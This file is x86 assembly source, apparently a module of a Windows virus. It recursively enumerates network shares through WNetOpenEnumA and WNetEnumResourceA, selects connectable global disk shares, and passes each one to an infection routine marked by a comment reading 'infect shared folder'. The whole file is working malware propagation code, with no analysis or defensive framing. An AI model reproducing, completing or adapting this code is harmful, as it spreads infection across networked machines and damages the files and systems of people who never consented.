; shares scan
__x	equ rec
;locals __

NETRESOURSE struc
dwScope 	dd 0
dwType 		dd 0
dwDisplayType	dd 0
dwUsage		dd 0
lpLocalName dd 0
lpRemoteName 	dd 0
lpComment 	dd 0
lpProvider 	dd 0
NETRESOURSE ends
sizenetres	equ 32

level2	db 0

subsharesscan:
rec2cnt	equ 5
st2size	equ 6*4
bufsize	equ ebx+1Ch
count	equ ebx+18h
plres	equ ebx+14h
hnet 	equ ebx+10h 
scope	equ ebx+0Ch  
pres	equ  ebx+08h ; pointer to NETRSOURSE 

	push ebx
	mov ebx, esp
	inc 1 ptr [ebp+level2-__x]
	cmp 1 ptr [ebp+level2-__x], rec2cnt
	jnb endsubscan
				
	lea eax, [hnet]						
	push eax
	push dword ptr [pres]
	push 0
	push 0 ;  RESOURCETYPE_ANY
	push dword ptr [scope]
	xcall WNetOpenEnumA
	test eax, eax
	jnz endsubscan
		
	; allocate memory
	mov eax, 1024*32
	call _valloc
	mov dword ptr [plres], eax
	jnz @569
	push dword ptr [hnet]
	xcall WNetCloseEnum
	jmp endsubscan
@569:
whilebeg:
	mov dword ptr [count], 1
	mov dword ptr [bufsize], 8192*2
	lea eax, [bufsize]
	push eax
	push dword ptr [plres]
	lea eax, [count]
	push eax
	push dword ptr [hnet]
	xcall WNetEnumResourceA

	cmp eax, 259 ; ERROR_NO_MORE_ITEMS
	jz endenum

IF DEBUG EQ 1
	mov esi, [plres].lpRemoteName
	call _3474
	db 13, 10, 0
_3474:	
	call _cout
	test esi, esi
	jz _3465
	push esi
	call _cout
_3465:
ENDIF

	mov eax, dword ptr [plres]
	cmp [eax].dwScope, RESOURCE_GLOBALNET
	jnz  noglobal
	mov ecx, [eax].dwUsage
	test ecx, RESOURCEUSAGE_CONNECTABLE
	jz @876
	cmp [eax].dwType, RESOURCETYPE_DISK
	jnz @876

	; infect shared folder
	mov esi, [plres].lpRemoteName
	test esi, esi
	jz noglobal

IF DEBUG EQ 1
	call _3453
	db " : FOLDER", 0
_3453:
	call _cout
ENDIF

	mov [level], 3
	mov [countinfect], max-20

	sub esp, stsize
	mov ecx, 16*1024
	add ecx, 4 ptr [plres]
	sub ecx, esi
	lea edi, [esp+4]
	xor edx, edx
copyname:
	mov al, byte ptr [esi+edx-1]
	mov byte ptr [edi+edx-1], al
	test al, al
	jz @87
	inc edx
	loop copyname
@87:

	call recinf
	add esp, stsize

@876:
	mov eax, dword ptr [plres]
	mov ecx, [eax].dwUsage
	and ecx, RESOURCEUSAGE_CONTAINER
	jz noglobal
		
	sub esp, st2size-8
	push dword ptr [scope]
	push dword ptr [plres]
	call subsharesscan
	add esp, st2size	


noglobal:
	jmp whilebeg

endenum:
	; free buffer
	mov eax, [plres]
	call _vfree
	push dword ptr [hnet]
	xcall WNetCloseEnum

endsubscan:
	dec 1 ptr [ebp+level2-__x]
	mov esp, ebx
	pop ebx
	ret

share:
	mov 1 ptr [ebp+level2-__x], 0
	sub esp, st2size-8
	push RESOURCE_GLOBALNET
	push 0
	call subsharesscan
	add esp, st2size	
	ret

RESOURCE_CONNECTED	equ 00000001h
RESOURCE_GLOBALNET	equ 00000002h
RESOURCE_REMEMBERED	equ	00000003h
RESOURCE_RECENT 	equ 00000004h
RESOURCE_CONTEXT    equ    00000005h
RESOURCETYPE_ANY    equ    00000000h
RESOURCETYPE_DISK   equ    00000001h
RESOURCETYPE_PRINT  equ    00000002h
RESOURCETYPE_RESERVED  equ 00000008h
RESOURCETYPE_UNKNOWN   equ 0FFFFFFFFh
RESOURCEUSAGE_CONNECTABLE equ  00000001h
RESOURCEUSAGE_CONTAINER   equ  00000002h
